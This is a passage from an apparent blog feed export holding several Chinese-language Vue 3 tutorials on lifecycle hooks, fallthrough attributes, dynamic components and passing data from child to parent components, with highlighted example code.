<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Main</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Main</span> <span class="keyword">from</span> <span class="string">&#x27;./components/Main.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Main</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后启动项目：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm run dev</span><br></pre></td></tr></table></figure>
<p>总结</p>
<ul>
<li>父子组件通信：通过 $emit 在子组件中发送事件，在父组件中监听并处理。</li>
<li>数据绑定：v-model 简化了表单元素与数据之间的双向绑定。</li>
<li>模块化开发：将功能拆分为多个组件，提高可维护性和复用性。</li>
</ul>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结二十七【Vue组件生命周期】</title>
    <url>/cnblogs.github.io/p/85db.html</url>
    <content><![CDATA[<p>每个Vue组件实例在创建时都需要经历一系列的初始化步骤，比如设置好数据侦听，编译模板，挂载实例到DOM，以及在数据改变时更新DOM。在此过程中，它也会运行被称为生命周期钩子的函数，让开发者有机会在特定阶段运行自己的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 组件的生命周期</span><br><span class="line"> * 1. 创建阶段:beforeCreate,created</span><br><span class="line"> * 2. 挂载阶段:beforeMount,mounted</span><br><span class="line"> * 3. 更新阶段:beforeUpdate,updated</span><br><span class="line"> * 4. 销毁阶段:beforeUnmount,unmounted</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>
<p>在 Vue 中，组件的生命周期是指从创建到销毁的整个过程。Vue 提供了多个钩子函数，允许我们在特定的阶段执行自定义逻辑。<br>Vue 组件的生命周期可以分为四个主要阶段：</p>
<h3 id="1-创建阶段"><a href="#1-创建阶段" class="headerlink" title="1. 创建阶段"></a>1. 创建阶段</h3><ul>
<li>beforeCreate()：组件实例刚刚被创建，此时数据观测和事件配置尚未初始化。</li>
<li>created()：组件实例已经创建完成，数据观测、属性和事件方法已经配置好。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">beforeCreate</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件创建之前&#x27;</span>);</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">created</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件创建完毕&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-挂载阶段"><a href="#2-挂载阶段" class="headerlink" title="2. 挂载阶段"></a>2. 挂载阶段</h3><ul>
<li>beforeMount()：模板编译&#x2F;挂载之前，此时还没有渲染 DOM。</li>
<li>mounted()：模板渲染完成，此时可以访问 DOM 元素。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">beforeMount</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件挂载/渲染之前&#x27;</span>);</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件挂载/渲染完毕&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-更新阶段"><a href="#3-更新阶段" class="headerlink" title="3. 更新阶段"></a>3. 更新阶段</h3><ul>
<li>beforeUpdate()：组件更新之前，响应式数据发生变化但 DOM 还未更新。</li>
<li>updated()：组件更新完成后调用，此时 DOM 已经更新。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">beforeUpdate</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件更新之前&#x27;</span>);</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">updated</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件更新完毕&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-销毁阶段"><a href="#4-销毁阶段" class="headerlink" title="4. 销毁阶段"></a>4. 销毁阶段</h3><ul>
<li>beforeUnmount()：组件销毁之前调用，此时组件仍然完全可用。</li>
<li>unmounted()：组件销毁完成后调用，此时所有指令已被解绑，子组件也已被销毁。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">beforeUnmount</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件销毁之前&#x27;</span>);</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">unmounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件销毁完毕&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以下是一个完整的示例，展示了如何在 App.vue 文件中使用这些生命周期钩子：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">beforeCreate</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件创建之前&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">created</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件创建完毕&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">beforeMount</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件挂载/渲染之前&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件挂载/渲染完毕&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">beforeUpdate</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件更新之前&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">updated</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件更新完毕&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">beforeUnmount</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件销毁之前&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">unmounted</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件销毁完毕&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>组件的生命周期<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>app.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">messgae</span>: <span class="string">&#x27;更新之前&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">updataHandle</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">messgae</span> = <span class="string">&#x27;更新之后&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">beforeCreate</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件创建之前&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">created</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件创建完毕&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">beforeMount</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件挂载/渲染之前&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件挂载/渲染完毕&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">beforeUpdate</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件更新之前&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">updated</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件更新完毕&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">beforeUnmount</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件销毁之前&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">unmounted</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件销毁完毕&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>组件的生命周期<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; messgae &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;updataHandle&quot;</span>&gt;</span>更新<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结二十三【Vue透传Attributes】</title>
    <url>/cnblogs.github.io/p/698e.html</url>
    <content><![CDATA[<p><strong>透传 Attributes</strong></p>
<p>透传attribute指的是传递给一个组件，却没有被该组件声明为props或emits的attribute或者v-on事件监听器。最常见的例子就是class、style和id.当一个组件以单个元素为根作渲染时，透传的attribute会自动被添加到根元素上<br>透传 Attributes 是 Vue 的一个特性，允许父组件传递任意属性到子组件上，而无需显式声明。这在封装可复用的组件时非常有用。</p>
<h3 id="步骤-1-创建子组件"><a href="#步骤-1-创建子组件" class="headerlink" title="步骤 1: 创建子组件"></a>步骤 1: 创建子组件</h3><p>创建一个名为 AttrComponents.vue 的子组件，并定义一个模板部分：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--  必须是唯一元素  如果多了其他元素 就不生效  比如&lt;p&gt;&lt;h2&gt;等--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>透传属性<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个组件没有显式声明任何 props 或其他属性处理逻辑。</p>
<h3 id="步骤-2-在父组件中使用子组件"><a href="#步骤-2-在父组件中使用子组件" class="headerlink" title="步骤 2: 在父组件中使用子组件"></a>步骤 2: 在父组件中使用子组件</h3><p>在你的主组件 App.vue中导入并注册子组件 AttrComponents：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">AttrComponents</span> <span class="keyword">from</span> <span class="string">&quot;./components/AttrComponents.vue&quot;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">AttrComponents</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">AttrComponents</span> <span class="attr">class</span>=<span class="string">&quot;attr-container&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.attr-container</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在这个例子中，我们通过 class&#x3D;”attr-container” 将样式类传递给子组件。</p>
<h3 id="步骤-3-使用透传的属性"><a href="#步骤-3-使用透传的属性" class="headerlink" title="步骤 3: 使用透传的属性"></a>步骤 3: 使用透传的属性</h3><p>当子组件接收到这些属性时，它们会自动应用到子组件的根元素上。在上面的例子中，class&#x3D;”attr-container” 被应用到了 <h3> 元素上，因此 <h3> 的文字颜色将会是红色。</p>
<p><strong>注意事项</strong></p>
<ul>
<li>透传的属性会直接绑定到组件的根元素上。</li>
<li>如果你在子组件中需要对属性进行更复杂的处理，可以使用 props显式声明它们。</li>
<li>如果你不希望某些属性被自动绑定，你可以使用inheritAttrs选项来控制。<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--  必须是唯一元素  如果多了其他元素 就不生效  比如&lt;p&gt;&lt;h2&gt;等--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>透传属性<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">inheritAttrs</span>:<span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结二十九【Vue动态组件】</title>
    <url>/cnblogs.github.io/p/c63a.html</url>
    <content><![CDATA[<p><strong>动态组件</strong><br>有些场景会需要在两个组件间来回切换，比如 Tab 界面，我们准备好A B两个组件ComponentA ComponentA<br>App.vue代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">ComponentA</span> <span class="keyword">from</span> <span class="string">&quot;./components/ComponentA.vue&quot;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">ComponentB</span> <span class="keyword">from</span> <span class="string">&quot;./components/ComponentB.vue&quot;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 初始化组件状态，决定首先渲染ComponentA</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">tabComponent</span>: <span class="string">&#x27;ComponentA&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">ComponentA</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">ComponentB</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 动态组件，根据data中的tabComponent属性值来决定渲染哪个组件 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">component</span> <span class="attr">:is</span>=<span class="string">&quot;tabComponent&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>现在我们加个按钮来切换组件：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 导入组件A</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">ComponentA</span> <span class="keyword">from</span> <span class="string">&quot;./components/ComponentA.vue&quot;</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 导入组件B</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">ComponentB</span> <span class="keyword">from</span> <span class="string">&quot;./components/ComponentB.vue&quot;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 初始化组件状态，决定首先渲染ComponentA</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">tabComponent</span>: <span class="string">&#x27;ComponentA&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 注册组件A和组件B</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">ComponentA</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">ComponentB</span></span></span><br><span class="line"><span class="language-javascript">  &#125;, <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 切换组件的方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">changeHandle</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 根据当前的tabComponent属性值来决定切换到哪个组件</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">tabComponent</span> = <span class="variable language_">this</span>.<span class="property">tabComponent</span> === <span class="string">&#x27;ComponentA&#x27;</span> ? <span class="string">&#x27;ComponentB&#x27;</span> : <span class="string">&#x27;ComponentA&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 动态组件，根据data中的tabComponent属性值来决定渲染哪个组件 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">component</span> <span class="attr">:is</span>=<span class="string">&quot;tabComponent&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 当用户点击按钮时，调用changeHandle方法来切换组件 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;changeHandle&quot;</span>&gt;</span>切换组件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结二十二【Vue组件数据传递】</title>
    <url>/cnblogs.github.io/p/66e0.html</url>
    <content><![CDATA[<p><strong>_组件数据传递</strong><br>我们之前讲解过了组件之间的数据传递，props 和自定义事件 两种方式</p>
<ul>
<li>props：父传子</li>
<li>自定义事件：子传父</li>
</ul>
<p>除了上述的方案，props也可以实现子传父</p>
<h2 id="一、项目结构"><a href="#一、项目结构" class="headerlink" title="一、项目结构"></a>一、项目结构</h2><p>src&#x2F;<br>└── components&#x2F;<br>    ├── ComponentsA.vue  # 父组件<br>    └── ComponentsB.vue  # 子组件</p>
<h2 id="二、子组件-ComponentsB-vue-解析"><a href="#二、子组件-ComponentsB-vue-解析" class="headerlink" title="二、子组件(ComponentsB.vue)解析"></a>二、子组件(ComponentsB.vue)解析</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;&#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">props</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">onEvent</span>: <span class="title class_">Function</span>  <span class="comment">// 接收父组件传递的函数</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>ComponentsB<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; onEvent(&#x27;传递数据&#x27;) &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span>  <span class="comment">&lt;!-- 调用父组件函数并传递参数 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="三、父组件-ComponentsA-vue-解析"><a href="#三、父组件-ComponentsA-vue-解析" class="headerlink" title="三、父组件(ComponentsA.vue)解析"></a>三、父组件(ComponentsA.vue)解析</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">ComponentsB</span> <span class="keyword">from</span> <span class="string">&quot;@/components/ComponentsB.vue&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">ComponentsB</span>  <span class="comment">// 注册子组件</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">message</span>: <span class="string">&#x27;&#x27;</span>  <span class="comment">// 用于接收子组件传递的数据</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">dataFn</span>(<span class="params">data</span>) &#123;  <span class="comment">// 子组件调用的方法</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">message</span> = data</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>ComponentsA<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>父元素：&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span>  <span class="comment">&lt;!-- 